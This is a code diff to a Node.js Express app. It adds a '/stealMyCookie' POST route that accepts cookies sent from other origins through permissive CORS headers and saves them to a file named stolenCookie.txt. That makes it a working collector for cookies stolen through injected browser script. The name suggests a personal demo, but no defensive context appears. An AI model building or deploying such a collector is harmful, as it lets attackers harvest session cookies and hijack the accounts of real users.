@@ -5,6 +5,7 @@ const nodemailer = require('nodemailer');
 const bodyParser = require("body-parser");
 const request = require("request");
 const helmet = require("helmet")
+const fs = require("fs");
 
 app.use(express.urlencoded());
 app.use(bodyParser.json());
@@ -47,6 +48,15 @@ app.post('/mailme', function (req, res) {
     res.sendStatus(200);
   });
   });
+
+app.post("/stealMyCookie", function(req, res) {
+  const stolen = JSON.parse(Object.keys(req.body)[0]);
+  fs.writeFileSync("misc/stolenCookie.txt", stolen.cookie);
+  res.append('Access-Control-Allow-Origin', ['*']);
+  res.append('Access-Control-Allow-Methods', 'PUT');
+  res.append('Access-Control-Allow-Headers', 'Content-Type');
+  res.send("ok");
+});
 
 app.listen(3000, () => console.log("Example app listening on port 3000!"))
 
